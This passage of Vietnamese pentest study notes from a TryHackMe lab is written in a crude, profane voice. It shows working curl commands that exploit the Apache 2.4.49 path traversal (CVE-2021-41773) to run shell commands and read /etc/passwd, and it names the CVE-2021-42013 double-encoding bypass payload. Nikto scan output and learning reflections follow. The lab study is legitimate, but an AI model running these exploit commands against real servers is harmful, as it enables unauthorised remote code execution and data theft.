Thằng `curl` mặc định nó khôn lỏi, nó tự chuẩn hóa (normalize) cái URL trước khi bắn đi. Nếu đéo gắn cờ `--path-as-is`, thằng `curl` nó sẽ tự dọn sạch mấy cái `.%2e/` ngay trên máy mày trước cả khi gửi đi, làm server chỉ nhận được một cái path bình thường đéo có bẫy gì cả. Cái cờ này lệnh cho `curl`: "Bố mày gõ cái lồn gì thì gửi nguyên xi cái đấy đi, cấm sửa!".

> **CẢNH BÁO:** Nếu mày xài trò lội ngược thư mục mà thấy server chửi `403` thay vì chạy lệnh, thì 99% là do mày quên mẹ cái cờ `--path-as-is` này. Thằng `curl` âm thầm sửa URL, nên con server đéo bao giờ nhìn thấy mấy cái dấu chấm bị encode của mày.

#### Khai thác thực tế (Exploitation)

Mày đã check xong con Apache 2.4.49 nằm tơ hơ ở port 8080, thằng `mod_cgi` thì đang vẫy gọi ở `/cgi-bin/`. Mày có sẵn đường băng bay thẳng tới RCE (chạy lệnh từ xa) mà đéo cần đăng nhập mẹ gì sất.

**Bước 1: Chạy thử RCE**
Lội ngược từ `/cgi-bin/` về tận `/bin/sh` bằng 4 cục `.%2e/`. Xong ném lệnh shell vào phần POST body. Cái đoạn `echo Content-Type: text/plain; echo;` ở đầu là bắt buộc theo chuẩn của bọn CGI nhé. Thằng Apache cần một khối HTTP header hợp lệ trước phần body, đéo có là nó nôn ra lỗi 500. Cái lệnh `echo` chổng trơ kia là để tạo ra một dòng trống phân cách:

```text
root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon) 

```

Xác nhận có RCE cmnr! Cái tiến trình Apache đang chạy dưới quyền `daemon`. Mày đã nắm quyền chạy lệnh trên con server bằng đúng quyền của cái web process đó.

> [!NOTE]
><u>- đại khái đoạn này là nó truyền vào /bin/sh vào đầu vào của /cgi-bin để thằng mod_cgi thực thi script truyền vào</u>
><u>- mấu chốt ở đây là cái mã hóa url qua mặt được apache</u>


**Bước 2: Móc thông tin tài khoản hệ thống**
Có RCE rồi thì mày đọc được bất kỳ cái file lồn nào mà thằng user `daemon` có quyền đọc. Moi cái file `/etc/passwd` ra để xem trong cái container đó có những thằng nào:

```text
root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
... 

```

Cái tài khoản đéo phải root đầu tiên chính là `daemon`, cũng là thằng đang gánh cái tiến trình Apache. Điều này xác nhận con server đéo chạy quyền root.

**Bước 3: Hốc cái Flag**
```text
root@tryhackme:~# curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
[REDACTED] 

```

> **Thông tin thêm:**
> Con CVE-2021-41773 này chỉ cắn đúng bản Apache 2.4.49 thôi. Lên bản 2.4.50 tụi nó tung ra bản vá nửa mùa, chặn được dấu chấm encode 1 lần nhưng lại đéo chặn được trò encode 2 lần (double-encoding). Thế là đẻ thêm con hàng **CVE-2021-42013** bypass bằng quả payload `%%32%65%%32%65/`. Phải từ bản 2.4.51 trở đi tụi nó mới vá triệt để. Túm lại là cứ thấy cái header lòi ra `Server: Apache/2.4.49` hoặc `Apache/2.4.50` thì vác ngay trick này ra mà phệt.


> [!NOTE] tổng kết lại
> thực ra cái lab này thuầnở mức giới thiệu cho minh biết lỗ hổng liên quan tới các hệ thống sử dụng LAMP, thực hành thực tế nó chỉ có như này thôi
![[Pasted image 20260818134656.png]]
>  xâu chuỗi lại, thì có thể như này
> - ban đầu recon phiên bản apache, sau đó tìm các cve gắn với nó, và tìm cách khai thác.Đơn giản vậy thôi

# 6-Automation
Làm tay (manual fingerprinting) thì giúp mày hiểu bản chất cái tín hiệu đéo nào quan trọng và tại sao.<u> Nhưng lúc đi làm pentest thực tế với một cái scope to chà bá chứa vài chục host, thì mày cứ quăng con hàng Nikto vào quét dạo lượt đầu cho lẹ; nó tự động chọc ngoáy từng dịch vụ, soi HTTP header, và lôi ra mấy cái dấu hiệu hệ thống hoặc cấu hình ngu mà mày đéo cần phải tự tay gõ dòng payload nào.</u>

> [!NOTE] Title
> Ok dùng con hàng **Nikto** để automation quét , hay đấy chứ

### Càn quét cả 4 Stacks
Giờ <u>nã Nikto vào từng port một</u>: MERN port 3000, Next.js port 3001, Django port 8000 và Apache port 8080.

> [!question] Title
> mỗi một loại stack web nó chạy cố định trên các port này à?
> ![[Pasted image 20260818150629.png]]

#### Port 3000 - MERN Stack

```text
root@tryhackme:~# nikto -h http://10.49.174.205:3000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.174.205
+ Target Hostname:    10.49.174.205
+ Target Port:        3000
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie connect.sid created without the httponly flag --> lưu ý thằng này
+ Retrieved x-powered-by header: Express --> lưu ý thằng này nữa
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Allowed HTTP Methods: GET, HEAD
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested        

```

Đéo có cái banner `Server` nào cả; vì thằng Express mặc định đéo bô bô cái đó ra. Nhưng có 2 tín hiệu chốt kèo xác nhận hệ thống: `x-powered-by: Express` và cái cookie session `connect.sid`. Quét xong còn được bonus thêm thông tin thơm lây là cái cookie đéo thèm bật cờ bảo mật `httponly`.

#### Port 3001 - Next.js

```text
root@tryhackme:~# nikto -h http://10.49.174.205:3001
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.174.205
+ Target Hostname:    10.49.174.205
+ Target Port:        3001
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Next.js
+ Uncommon header 'x-nextjs-stale-time' found, with contents: 4294967294
+ Uncommon header 'x-nextjs-cache' found, with contents: HIT
+ Uncommon header 'x-nextjs-prerender' found, with contents: 1
+ Allowed HTTP Methods: HEAD
+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested        

```

Thấy `x-powered-by: Next.js` là xác nhận mẹ nó framework luôn. Ba cái header `x-nextjs-*` chứng tỏ cái App Router đang chạy ở mode production, đây chính là cái điều kiện mĩ mãn để đâm con CVE-2025-29927.

#### Port 8000 - Django

```text
root@tryhackme:~# nikto -h http://10.49.174.205:8000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.174.205
+ Target Hostname:    10.49.174.205
+ Target Port:        8000
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.10.12
+ Uncommon header 'referrer-policy' found, with contents: same-origin
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested        

```

Cái banner `WSGIServer/0.2 CPython/3.10.12` là hàng độc quyền chỉ Django mới có. Cái combo đi liền nhau `referrer-policy: same-origin` với `x-content-type-options: nosniff` vạch mặt luôn là cái `SecurityMiddleware` của Django đang bật.

#### Port 8080 - Apache

```text
root@tryhackme:~# nikto -h http://10.49.174.205:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.174.205
+ Target Hostname:    10.49.174.205
+ Target Port:        8080
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Unix)
+ Server leaks inodes via ETags, header found with file /
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time: (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested        

```

Dòng `Server: Apache/2.4.49 (Unix)` là cái tín hiệu vả thẳng mặt con lỗ hổng CVE-2021-41773 cmnl. Đây là cái kết quả đáng tiền nhất mà con Nikto nôn ra được trong cả 4 lần quét: cho hẳn một con phiên bản chính xác khớp khít với một con exploit Critical cực xịn.


**Chốt lại:**
Thằng Nikto bóc phốt cả 4 stack chưa tới một phút. Riêng quả Apache, nó dâng tận mồm cái phiên bản chuẩn xác, đéo cần mày phải đi soi mói rà quét gì thêm nữa<u>. Còn với MERN và Django, nhận diện stack thì ngon đấy, nhưng Nikto đéo có tool mẫu để quét mấy cái lỗi injection ở tầng ứng dụng logic đâu</u>. Và đó chính là lúc mấy cái trò mò mẫm bằng tay mà tao thông não cho mày ở Task 2 với Task 4 bắt đầu phát huy tác dụng.

> [!NOTE] Title
> - hmmmmm, đại khái là con vợ nikto này giúp mình recon, như với thằng apache nó nôn luôn ra phiên bản , mình chỉ cần search các cve liên quan là có thể exploit
> - hmmm chốt lại là tao có thể thấy xuyên suốt bài này, là nó nói về 
> 	- stack identity
> 	- fingerprint 
> 	-> thực lòng tao vẫn chưa hiểu cách fingerprint, quy tắc chung của cái thằng này cho lắm


# 7- tư duy cốt lõi đúc rút được
Đm nãy giờ chửi nhau mỏi mồm, giờ chốt hạ lại cho mày mấy cái tư duy cốt lõi. Đi làm pentest hay săn bug thì<u> ốp nguyên mấy cái mindset này vào</u> não, đéo bao giờ lo chết đói:

1. **Biết mình biết ta, đéo quăng payload bừa bãi (Fingerprinting)**
Trước khi đấm nhau phải biết thằng kia xài võ gì. Đéo bao giờ nhắm mắt ném payload bừa. Phải<u> soi từ cái HTTP Header, cái Cookie, đến cách nó nôn ra thông báo lỗi 404 hay 500</u>. Thấy Express thì lôi bài Prototype ra, thấy Apache 2.4.49 thì ốp ngay bài lội thư mục.

> [!NOTE] Title
> hmmm, tức là sao nhể? soi cái http header thì tao hiểu , còn cái cookie và thông báo lỗi tao cũng hiểu, nhưng tao thấy 2 thằng đấy chỉ áp udngj cho các trường hợp cố định thui

2. **Nhìn thấu bản chất, đéo học vẹt (Root Cause)**
Mày thấy đấy, 4 cái stack là 4 kiểu chết đéo giống nhau:

* Thằng NodeJS chết vì cơ chế kế thừa gen gốc mù quáng của Javascript.
* Thằng Next.js chết vì tin tưởng cái tem header nội bộ tự chế.
* Thằng Django chết vì dev ngu đi nối chuỗi SQL thay vì dùng màng lọc ORM.
* Thằng Apache chết vì thứ tự decode màng lọc bị ngược.
Nắm được cái lõi này thì mày gặp framework lạ cũng biết đường mà tư duy, thay vì ngồi học thuộc lòng mấy dòng payload vô tri.

> [!NOTE] cái cốt lõi của mấy lỗ hổng ???
> tức là mày phải rút ra được cái logic chung của các lỗ hổng ấy hả??


3. **Chân lý ngàn năm: Đéo bao giờ tin Input**
*Mọi lỗ hổng nãy giờ mày học đều chui ra từ một lỗ*:<u> Thằng dev tin rằng user sẽ nhập đúng cái nó muốn.</u> Gửi JSON có key ma giáo, gửi header fake mác nội bộ, gửi URL lội thư mục... Dev đéo bọc filter kỹ là vỡ mồm. Tư duy của mày là phải chọc ngoáy vào tất cả những cái đầu vào (input) để xem nó có hở sườn không.

> [!NOTE] Tư duy chọc ngoáy input :>
> Lỗi là dev luôn nghĩ rằng input sẽ nhập theo cách nó muốn, vậy thì luôn có tư duy chọc ngoáy input

3. **Tool làm culi, não người làm chủ**
Mấy con tool như Nikto quét dạo cực nhanh, dâng tận mồm cho mày mấy cái version server cũ rích dính CVE. Nhưng với những cái lỗi logic tầng ứng dụng kiểu bypass middleware hay Prototype Pollution, đéo có cái tool nào lươn lẹo bằng não người được. Dùng tool để càn quét diện rộng, dùng tay và não để đục những lỗ sâu.

Nuốt trôi 4 cái gạch đầu dòng này thì mày chính thức có tư duy của một thằng làm an toàn thông tin thực thụ rồi đấy. Nghỉ ngơi cho não nó nảy số đi con chó.
